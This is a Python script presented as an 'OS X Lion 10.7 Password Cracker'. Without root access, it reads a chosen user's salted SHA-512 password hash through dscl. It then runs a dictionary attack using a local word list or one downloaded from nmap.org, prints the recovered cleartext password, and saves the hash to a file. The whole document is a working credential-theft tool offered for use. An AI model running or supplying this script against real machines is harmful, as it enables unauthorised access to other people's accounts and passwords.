#!/usr/bin/python -tt

from subprocess import *
import hashlib
import os
import urllib2
import sys
from string import *

def usage():
  print(' ###############################################')
  print(' #* OS X Lion 10.7 Password Cracker')
  print(' #* UID 0 NOT required')
  print(' #*')
  print(' #* Usage:')
  print(' #* python lion_crack.py [username] [dictionary]')
  print(' #*')
  print(' #*')
  print(' #* Patrick Dunstan')
  print(' #* Sep 18, 2011')
  print(' #* http://www.defenceindepth.net')
  print(' #*')
  print(' ###############################################')

if len(sys.argv) < 2:
  usage()
  sys.exit()

link = "http://nmap.org/svn/nselib/data/passwords.lst" # Online password file
defaultuser = False
username = ""

def check(password): # Hash password and compare
		
	if not password.startswith("#!"): # Ignore comments

		guess = hashlib.sha512(salt_hex + password).hexdigest()
		print("Trying... " + password)
	
		if guess == hash:
			print("Cleartext password for user '"+username+"' is : "+password)
			exit(0)

if len(sys.argv) < 2:
	print("No username given. Defaulting to current user.")
	defaultuser = True
else:
	username = sys.argv[1]

p = Popen("whoami", shell=True, stdout=PIPE)
whoami = p.communicate()[0]

if defaultuser:
	username = whoami.rstrip()

p = Popen("dscl localhost -read /Search/Users/" + username, shell=True, stdout=PIPE)
dscl_out = p.communicate()[0]

list = dscl_out.split("\n")

for pos,item in enumerate(list): # extract digest
	if "dsAttrTypeNative:ShadowHashData" in item:
		digest = list[pos+1].replace(" ", "")

if len(digest) == 262: # Out of box configuration	
	salt = digest[56:64]	
	hash = digest[64:192]
elif len(digest) == 314: # SMB turned on
	print("SMB is on")
	salt = digest[104:112]
	hash = digest[112:240]
elif len(digest) == 1436: # Lion Server
	salt = digest[176:184]
	hash = digest[176:304]
elif len(digest) == 1492: # Lion Server with SMB
	salt = digest[224:232]
	hash = digest[232:360]

print("SALT : " + salt)
print("HASH : " + hash)

salt_hex =  chr(int(salt[0:2], 16)) + chr(int(salt[2:4], 16)) + chr(int(salt[4:6], 16)) + chr(int(salt[6:8], 16))

if len(sys.argv) == 3: # If dictionary file specified
        print("Reading from dictionary file '"+sys.argv[2]+"'.")
        check(whoami.rstrip())
        passlist = open(sys.argv[2], "r")
        password = passlist.readline()
 
        while password:
                check(password.rstrip())
                password = passlist.readline()
        passlist.close()
 
else: # No dictionary file specified
        print("No dictionary file specified. Defaulting to hard coded link.")
        
        passlist = urllib2.urlopen(link) # Download dictionary file
        passwords = passlist.read().split("\n")
        print("\nPassword list successfully read")
	
        passwords.append(whoami.rstrip())	
 	
        print("\nCracking...")
        for password in passwords:
                check(password)

# Save hash for later
print("\nSaving hash to "+username+".hash...")
out = open(username+".hash", "w")
out.write(salt+hash)
out.close()

print("\nPassword not found. Try another dictionary.\n")
